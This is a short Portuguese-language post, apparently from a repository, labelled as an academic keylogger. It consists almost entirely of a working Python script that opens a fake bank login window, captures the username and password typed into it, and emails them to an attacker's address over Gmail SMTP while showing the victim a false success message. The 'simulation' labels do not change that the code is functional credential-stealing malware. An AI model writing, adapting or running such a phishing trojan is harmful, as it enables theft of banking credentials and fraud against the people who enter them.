### Keylogger para fins academicos
Implementei um script em Python para apresentar uma tela para usuario colocar as credenciais e enviar por email para o atacante.

**Código**:
```python
import tkinter as tk
from tkinter import messagebox
import smtplib
from email.mime.text import MIMEText
import threading
import time

# Configurações de e-mail (use contas de teste para simulação!)
EMAIL_ADDRESS = "seu_email_teste@gmail.com"
EMAIL_PASSWORD = "sua_senha_app"  # Use senha de app para Gmail
DESTINO_EMAIL = "destino_teste@gmail.com"

# Função para enviar credenciais por e-mail
def enviar_credenciais(usuario, senha):
    msg = MIMEText(f"Credenciais capturadas:\nUsuário: {usuario}\nSenha: {senha}")
    msg['Subject'] = "Credenciais Bancárias Capturadas (Simulação)"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = DESTINO_EMAIL

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, DESTINO_EMAIL, msg.as_string())
        server.quit()
        print("E-mail com credenciais enviado (simulação).")
    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")

# Função para simular o Trojan: exibir janela falsa de login bancário
def simular_trojan_bancario():
    # Criar janela GUI falsa de login bancário
    root = tk.Tk()
    root.title("Login Bancário - Simulação")
    root.geometry("300x200")

    # Label e campos de entrada
    tk.Label(root, text="Bem-vindo ao Banco Simulado").pack(pady=10)
    
    tk.Label(root, text="Usuário:").pack()
    entry_usuario = tk.Entry(root)
    entry_usuario.pack(pady=5)
    
    tk.Label(root, text="Senha:").pack()
    entry_senha = tk.Entry(root, show="*")
    entry_senha.pack(pady=5)
    
    # Função chamada ao clicar em "Login"
    def capturar_credenciais():
        usuario = entry_usuario.get()
        senha = entry_senha.get()
        if usuario and senha:
            # Simular envio de credenciais
            threading.Thread(target=enviar_credenciais, args=(usuario, senha)).start()
            messagebox.showinfo("Login", "Login realizado com sucesso! (Simulação)")
        else:
            messagebox.showwarning("Erro", "Preencha os campos!")

    # Botão de login
    tk.Button(root, text="Login", command=capturar_credenciais).pack(pady=10)

    # Rodar a janela
    root.mainloop()

# Exemplo de uso (execute em ambiente controlado!)
if __name__ == "__main__":
    print("Simulando Trojan Bancário... Uma janela falsa de login será exibida.")
    simular_trojan_bancario()
